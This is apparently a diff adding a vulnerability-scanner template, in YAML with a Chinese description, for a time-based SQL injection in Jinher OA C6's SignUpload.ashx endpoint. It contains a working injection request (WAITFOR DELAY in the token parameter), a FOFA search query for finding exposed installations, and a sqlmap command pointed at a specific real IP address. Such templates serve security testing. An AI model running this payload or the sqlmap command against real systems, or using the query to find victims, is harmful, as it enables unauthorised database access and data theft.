@@ -1,0 +1,33 @@
+id: jinher-oa-c6-SignUpload-sqli
+info:
+  name: 金和 OA c6 SignUpload.ashx - sqli
+  author: leadlife
+  severity: high
+  description: 金和OA系统接口SignUpload.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3SignUpload.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || app="Jinher-OA"
+    sqlmap: sqlmap -u "http://119.3.191.73/C6/Jhsoft.Web.ask/SignUpload.ashx?token=1;* -- and 1=1_123_123&filename=1" --batch --random-agent --dbms="Microsoft SQL Server"
+  tags: jinher,sqli,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%206%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+        Connection: close
+        Content-Length: 189
+        Content-Type: text/plain
+        Accept-Encoding: gzip
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains(body,'JHSoft')
+          - duration >= 5 && duration < 9
+        condition: and
